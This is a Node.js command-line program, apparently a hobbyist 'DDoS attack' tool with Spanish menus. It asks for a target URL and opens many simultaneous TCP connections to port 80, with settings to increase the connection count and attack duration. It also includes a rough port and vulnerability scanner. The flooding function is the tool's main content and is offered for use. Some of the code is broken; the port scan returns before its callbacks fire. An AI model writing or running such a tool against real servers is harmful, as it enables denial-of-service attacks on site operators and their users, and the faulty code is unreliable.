const net = require('net');
const rl = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});

const dns = require('dns');
const os = require('os');
const tls = require('tls');

const colors = {
reset: '[0m',
bright: '[1m',
dim: '[2m',
underscore: '[4m',
blink: '[5m',
reverse: '[7m',
hidden: '[8m',
fg: {
black: '[30m',
red: '[31m',
green: '[32m',
yellow: '[33m',
blue: '[34m',
magenta: '[35m',
cyan: '[36m',
white: '[37m',
},
bg: {
black: '[40m',
red: '[41m',
green: '[42m',
yellow: '[43m',
blue: '[44m',
magenta: '[45m',
cyan: '[46m',
white: '[47m',
},
};

const decorations = {
underline: '[4m',
bold: '[1m',
italic: '[3m',
};

const portScan = async (host, ports) => {
const results = [];
for (let i = 0; i < ports.length; i++) {
const port = ports[i];
const socket = new net.Socket();
socket.connect(port, host, () => {
results.push(`${port} is open`);
socket.destroy();
});
socket.on('error', (err) => {
results.push(`${port} is closed`);
});
}
return results;
};

const vulnAnalysis = async (host) => {
const vulns = [];
// Utilizamos una base de datos de vulnerabilidades conocidas
const vulnDb = require('./vuln-db.json');
for (let i = 0; i < vulnDb.length; i++) {
const vuln = vulnDb[i];
if (vuln.affects.includes(host)) {
vulns.push(vuln);
}
}
return vulns;
};

const softwareScan = async (host) => {
const software = [];
// Utilizamos un servicio de reconocimiento de software
const softwareService = require('./software-service.js');
softwareService.getVersion(host, (version) => {
software.push(version);
});
return software;
};

const securityScan = async (host) => {
const results = {
ports: await portScan(host, [80, 443, 22]),
vulns: await vulnAnalysis(host),
software: await softwareScan(host)
};
return results;
};

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`[36m Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`[31m Conectado a ${url}`);
});
socket.on('data', (data) => {
console.log(`Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`[36m Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`[36m Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};

const showMenu = () => {
console.clear(); // Limpiar la consola
console.log('[31m         DDoS attack    ');
console.log('⭐️ Desarrollado por Keiji821');
console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
console.log('[34m ︳2. Actualizar código                  ︳');
console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
console.log('[31m ︳5. Realizar análisis de seguridad    ︳');
console.log('[31m ︳6. Salir                              ︳');
console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍');
rl.setPrompt('[37m  🌐➤ '); // Establecer el texto de la casilla "Opción: "
rl.prompt(); // Mostrar la casilla "Opción:"
};

let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto

showMenu(); // Mostrar el menú principal al inicio

rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '2':
updateCode();
showMenu(); // Volver a mostrar el menú principal
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas: ');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos): ');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '5':
console.log('Ingrese la URL del objetivo para el análisis de seguridad: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
securityScan(url).then((results) => {
console.log(results);
showMenu(); // Volver a mostrar el menú principal
});
}
});
break;
case '6':
console.log('Saliendo...');
process.exit();
break;
}
}).on('close', () => {
process.exit();
});